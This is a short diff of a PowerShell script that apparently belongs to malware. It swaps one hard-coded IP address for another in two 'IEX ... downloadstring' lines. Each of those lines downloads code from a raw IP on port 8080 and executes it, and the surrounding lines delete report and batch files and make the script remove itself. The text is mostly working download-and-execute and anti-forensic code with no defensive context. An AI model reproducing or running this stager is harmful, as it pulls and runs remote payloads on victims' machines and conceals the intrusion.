@@ -1,10 +1,10 @@
 $githuburl = 'https://github.com/begiilm/dy/raw/master/'
-$connectip = '106.80.36.165'
+$connectip = '106.80.43.11'
 
 
 
 
-IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
+IEX ((new-object net.webclient).downloadstring('http://106.80.43.11:8080/'))
 
 
 
@@ -2945,6 +2945,6 @@ remove-item 'D:\Report.zip'
 remove-item 'D:\runcmd.bat'
 Remove-Item $MyINvocation.InvocationName
 
-IEX ((new-object net.webclient).downloadstring('http://106.80.36.165:8080/'))
+IEX ((new-object net.webclient).downloadstring('http://106.80.43.11:8080/'))
 
 
